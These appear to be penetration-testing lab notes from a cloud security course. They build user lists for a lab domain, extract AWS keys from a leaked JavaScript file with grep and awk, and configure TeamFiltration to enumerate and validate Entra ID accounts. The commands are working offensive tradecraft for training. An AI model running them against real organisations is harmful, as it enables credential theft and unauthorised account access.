**Construct a list of users**
```python
cat << EOF > /home/sec588/Coursefiles/workdir/users_temp1.txt
jerry.smith@sec588.org
jsmith@sec588.org
summer.smith@sec588.org
ssmith@sec588.org
tammy.gutterman@sec588.org
tgutterman@sec588.org
sleepy.gary@sec588.org
sgary@sec588.org
scary.terry@sec588.org
sterry@sec588.org
EOF
```

**Alertnatively, use "CeWL" to construct a username list and a general wordlist. Then combine these lists - YOU WILL NOT SEE OUTPUT OF COMMAND, FILES WILL BE WRITTEN OUT**
```python
docker run -it --rm -v "${PWD}:/host" cewl -e --email_file users_temp2.txt -w wordlist_temp.txt http://www.awesome-sparrow.sec588.cloud
```

AADInternals from Nestori Syynimaa. This tool is extremely feature-rich for Active Directory. At the same time, we do not introduce this tool in earnest to you. We will be using it for the reconnaissance of our domain only. There are some caveats of using this tool in Linux:

   - Not every feature will be supported.
   - It is not thoroughly tested in this build.

```python
Import-Module AADInternals
```
```python
Invoke-AADIntReconAsOutsider -Domain sec588.org | Format-Table
```

See if we can leverage our users.txt against the Entra ID System to validate which accounts are valid and which are not. You will need the uploader-service.json file from Lab 1.5

**Create AWS Access env var**
```python
AWSACCESS=$(cat /home/sec588/Coursefiles/workdir/uploader-service.js | grep AWS.config | tail -1 | awk -F\( '{ print $2 }' | awk -F\) '{ print $1 }' | awk -F\' '{ print $2 }') 
```

**Create AWS Key var**
```python
AWSKEY=$(cat /home/sec588/Coursefiles/workdir/uploader-service.js | grep AWS.config | tail -1 | awk -F\( '{ print $2 }' | awk -F\) '{ print $1 }' | awk -F\' '{ print $4 }')
```

**Output File Content**
```
cat << EOF > /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json
{
    "pushoverAppKey": "",
    "pushoverUserKey": "",
    "dehashedEmail" : "",
    "dehashedApiKey": "",
    "sacrificialO365Username": "summer@sec588.org",
    "sacrificialO365Passwords": "SnakeJazz2020" ,
    "proxyEndpoint": "http://127.0.0.1:8080",
    "AWSAccessKey": "$AWSACCESS",
    "AWSSecretKey": "$AWSKEY",
    "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36",
    "AwsRegions":["us-east-1", "us-east-2"]
}
EOF
```

**Run the configured `teamfiltration` command in order to ensure that we have valid accounts**
```python
/opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/users.txt
```

